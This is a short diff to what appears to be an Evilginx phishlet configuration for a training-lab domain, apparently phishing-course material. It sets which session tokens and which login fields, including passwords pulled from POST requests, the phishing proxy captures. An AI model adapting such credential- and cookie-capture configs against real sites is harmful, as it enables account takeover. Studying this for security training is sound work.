@@ -4,8 +4,8 @@ proxy_hosts:
 sub_filters:
 #  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
 auth_tokens:
-  - domain: 'akira.academy.breakdev.org'
-    keys: ['cookie_name']
+  - domain: 'akira.lab.evilginx.com'
+    keys: ['token:always']
 credentials:
   username:
     key: 'email'
@@ -16,5 +16,5 @@ credentials:
     search: '(.*)' # This is a regex pattern to search for the password in the POST request
     type: 'post'
 login:
-  domain: 'akira.lab.evilginx.com'
-  path: '/api/v1/auth/login'
+  domain: 'akira.lab.evilginx.com' #domain used as the landing page.
+  path: '/' #path to the login page.
